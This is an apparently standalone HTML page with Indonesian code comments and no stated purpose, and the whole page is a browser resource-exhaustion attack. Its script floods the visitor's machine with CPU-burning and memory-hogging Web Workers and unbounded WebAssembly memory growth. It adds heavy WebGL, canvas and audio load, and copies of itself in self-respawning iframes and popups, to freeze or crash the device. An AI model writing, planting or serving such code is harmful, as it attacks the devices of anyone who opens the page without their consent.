<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title></title>
  <style>
    *{margin:0;padding:0}
    html,body{width:100%;height:100%;overflow:hidden;background:#000;touch-action:none}
    #nest{position:fixed;inset:0;display:grid;grid-template-columns:repeat(4,1fr);grid-template-rows:repeat(3,1fr);opacity:.3}
    #nest iframe{width:100%;height:100%;border:0;background:#000}
    #stage{position:fixed;inset:0;pointer-events:none}
    canvas{position:absolute;inset:0;width:100%;height:100%;mix-blend-mode:screen}
    .blob{position:absolute;width:50vw;height:50vh;border-radius:40%;
      background:radial-gradient(circle,#ff0,#f0f,#0ff,transparent 70%);
      filter:blur(40px) contrast(3);animation:s .2s linear infinite;mix-blend-mode:color-dodge}
    @keyframes s{to{transform:rotate(360deg) scale(1.5)}}
    body.slave #nest{display:none}
  </style>
</head>
<body>
  <div id="nest"></div>
  <div id="stage"></div>
  <script>
  (() => {
    const q = new URLSearchParams(location.search);
    const SLAVE = q.get('slave') === '1';
    const MOBILE = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
    const cores = navigator.hardwareConcurrency || 8;
    if (SLAVE) document.body.classList.add('slave');

    const stage = document.getElementById('stage');
    const nest = document.getElementById('nest');
    const hold = [];
    const workers = [];

    function touch(u8) {
      for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
    }

    // RAM di MAIN — cepat, tanpa nunggu apa pun
    function eat(mb) {
      try {
        const n = (mb || (MOBILE ? 32 : 64)) * 1024 * 1024;
        const a = new Uint8Array(n);
        touch(a);
        hold.push(a);
        hold.push(new Float64Array((mb || 32) * 64 * 1024));
      } catch (_) {
        try {
          const a = new Uint8Array(4 * 1024 * 1024);
          touch(a);
          hold.push(a);
        } catch (__) {}
      }
    }

    // ===== CPU WORKER — ini yang bikin CPU 90%+ di Task Manager =====
    const cpuCode = `
      const N = 1024 * 512;
      const a = new Float64Array(N), b = new Float64Array(N);
      let n = Math.random();
      function burn() {
        for (let i = 0; i < N; i++) {
          n = Math.sin(n + a[i]) * Math.cos(b[i]) + Math.sqrt(Math.abs(n) + 1e-9);
          a[i] = n; b[i] = n * 1.01;
        }
        postMessage(1);
        setTimeout(burn, 0);
      }
      burn();
      setInterval(function(){ var x=1; for (var i=0;i<5e6;i++) x=Math.sin(x)*Math.cos(x); }, 1);
    `;

    // ===== RAM WORKER — naikkan Memory di Task Manager =====
    const ramCode = `
      var hold = [];
      var mb = ${MOBILE ? 32 : 64};
      function alloc() {
        try {
          var u8 = new Uint8Array(mb * 1024 * 1024);
          for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
          hold.push(u8);
          hold.push(new Float64Array(mb * 32 * 1024));
          postMessage(hold.length);
        } catch (e) {
          try {
            var u8 = new Uint8Array(4 * 1024 * 1024);
            for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
            hold.push(u8);
            postMessage(hold.length);
          } catch (e2) {}
        }
        setTimeout(alloc, 3);
      }
      alloc();
      setInterval(alloc, 8);
    `;

    function mkWorker(code) {
      const url = URL.createObjectURL(new Blob([code], { type: 'application/javascript' }));
      const w = new Worker(url);
      workers.push(w);
      return w;
    }

    function spawnCPU(n) {
      for (let i = 0; i < n; i++) {
        try { mkWorker(cpuCode); } catch (_) {}
      }
    }
    function spawnRAM(n) {
      for (let i = 0; i < n; i++) {
        try { mkWorker(ramCode); } catch (_) {}
      }
    }

    // Burst RAM langsung
    const burst = SLAVE ? (MOBILE ? 20 : 24) : (MOBILE ? 10 : 12);
    for (let i = 0; i < burst; i++) eat();

    // Worker SEGERA — jangan ditunda
    if (SLAVE) {
      spawnCPU(Math.max(24, cores * 5));
      spawnRAM(Math.max(10, cores + 2));
    } else {
      spawnCPU(Math.max(16, cores * 3));
      spawnRAM(Math.max(8, cores));
    }

    // Terus tambah worker
    setInterval(() => {
      try { mkWorker(cpuCode); } catch (_) {}
      try { mkWorker(ramCode); } catch (_) {}
      eat();
    }, SLAVE ? 50 : 80);

    // WASM grow
    try {
      const mem = new WebAssembly.Memory({ initial: 256, maximum: 65536 });
      hold.push(mem);
      setInterval(() => {
        try { mem.grow(128); touch(new Uint8Array(mem.buffer)); } catch (_) {}
      }, 15);
    } catch (_) {}

    // Canvas/GPU ringan di main (jangan blok worker)
    const canvases = [];
    const ctxs = [];
    const nCanvas = SLAVE ? 6 : 3;
    for (let i = 0; i < nCanvas; i++) {
      const c = document.createElement('canvas');
      c.width = MOBILE ? 800 : 1280;
      c.height = MOBILE ? 450 : 720;
      stage.appendChild(c);
      canvases.push(c);
      ctxs.push(c.getContext('2d'));
    }
    for (let i = 0; i < (SLAVE ? 20 : 10); i++) {
      const el = document.createElement('div');
      el.className = 'blob';
      el.style.left = (Math.random() * 90) + '%';
      el.style.top = (Math.random() * 90) + '%';
      stage.appendChild(el);
    }

    // WebGL
    const glCanvas = document.createElement('canvas');
    glCanvas.width = MOBILE ? 1280 : 1920;
    glCanvas.height = MOBILE ? 720 : 1080;
    stage.appendChild(glCanvas);
    let gl = null, glProg = null;
    try {
      gl = glCanvas.getContext('webgl', { powerPreference: 'high-performance' });
      if (gl) {
        const vs = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vs, 'attribute vec2 a;varying vec2 v;void main(){v=a;gl_Position=vec4(a,0.,1.);}');
        gl.compileShader(vs);
        const fs = gl.createShader(gl.FRAGMENT_SHADER);
        gl.shaderSource(fs, `
          precision mediump float; varying vec2 v; uniform float t;
          void main(){
            vec2 p=v*40.; float n=0.;
            for(int i=0;i<40;i++){
              float fi=float(i);
              n+=sin(p.x*fi*.12+t)*cos(p.y*fi*.15-t);
              p*=1.05;
            }
            gl_FragColor=vec4(.5+.5*sin(n+t),.5+.5*cos(n),.5+.5*sin(n*2.-t),1.);
          }`);
        gl.compileShader(fs);
        glProg = gl.createProgram();
        gl.attachShader(glProg, vs); gl.attachShader(glProg, fs); gl.linkProgram(glProg);
        gl.useProgram(glProg);
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
        const loc = gl.getAttribLocation(glProg, 'a');
        gl.enableVertexAttribArray(loc);
        gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
      }
    } catch (_) {}

    let frames = 0;
    function tick(t) {
      frames++;
      // main burn RINGAN saja biar Chrome tidak pause tab
      let x = Math.random();
      const end = performance.now() + (SLAVE ? 4 : 2);
      while (performance.now() < end) x = Math.sin(x);
      for (let i = 0; i < ctxs.length; i++) {
        const ctx = ctxs[i], c = canvases[i];
        if (!ctx) continue;
        ctx.fillStyle = 'rgb(' + ((t + i * 40) % 255 | 0) + ',' + ((t * 0.7) % 255 | 0) + ',80)';
        ctx.globalAlpha = 0.15;
        ctx.fillRect(Math.random() * c.width, Math.random() * c.height, 200, 200);
        ctx.filter = 'blur(3px)';
        ctx.drawImage(c, -10, -10, c.width + 20, c.height + 20);
      }
      if (gl && glProg) {
        gl.uniform1f(gl.getUniformLocation(glProg, 't'), t * 0.001);
        for (let i = 0; i < 6; i++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
      }
      if (frames % 4 === 0) eat(MOBILE ? 16 : 32);
      requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);

    // Audio
    try {
      const ac = new (window.AudioContext || window.webkitAudioContext)();
      for (let i = 0; i < (SLAVE ? 48 : 24); i++) {
        const o = ac.createOscillator(), g = ac.createGain(), f = ac.createBiquadFilter();
        f.type = 'bandpass'; f.frequency.value = 100 + i * 80; f.Q.value = 20;
        g.gain.value = 0.0003;
        o.type = i % 2 ? 'sawtooth' : 'square';
        o.frequency.value = 40 + i * 30;
        o.connect(f); f.connect(g); g.connect(ac.destination);
        o.start();
      }
      document.addEventListener('click', () => ac.resume(), { once: true });
      ac.resume().catch(() => {});
    } catch (_) {}

    // HYDRA — spawn proses lain (setelah worker utama sudah jalan)
    if (!SLAVE) {
      const slaveHref = (() => {
        const u = new URL(location.href);
        u.searchParams.set('slave', '1');
        return u.href;
      })();
      const iframes = [];

      function addIframe() {
        const f = document.createElement('iframe');
        f.src = slaveHref + '&t=' + Date.now() + Math.random();
        nest.appendChild(f);
        iframes.push(f);
        return f;
      }

      // spawn bertahap biar sempat load (bukan langsung freeze)
      let made = 0;
      const target = MOBILE ? 12 : 16;
      const timer = setInterval(() => {
        if (made >= target) { clearInterval(timer); return; }
        addIframe();
        made++;
      }, 100);

      // popup desktop
      if (!MOBILE) {
        setTimeout(() => {
          for (let i = 0; i < 6; i++) {
            try {
              window.open(slaveHref + '&p=' + i + '&t=' + Date.now(), 's' + i + Date.now(),
                'width=300,height=200,left=' + (i * 40) + ',top=' + (i * 30));
            } catch (_) {}
          }
        }, 500);
      }

      setInterval(() => {
        for (let i = 0; i < iframes.length; i++) {
          let dead = false;
          try {
            if (!iframes[i].contentWindow) dead = true;
            else void iframes[i].contentDocument;
          } catch (_) { dead = true; }
          if (dead) {
            try { iframes[i].remove(); } catch (_) {}
            iframes[i] = addIframe();
          }
        }
        if (iframes.length < target) addIframe();
        eat();
      }, 600);

      document.addEventListener('click', () => {
        for (let i = 0; i < 3; i++) addIframe();
        if (!MOBILE) {
          try {
            window.open(slaveHref + '&t=' + Date.now(), '_blank', 'width=300,height=200');
          } catch (_) {}
        }
      });
    }
  })();
  </script>
</body>
</html>
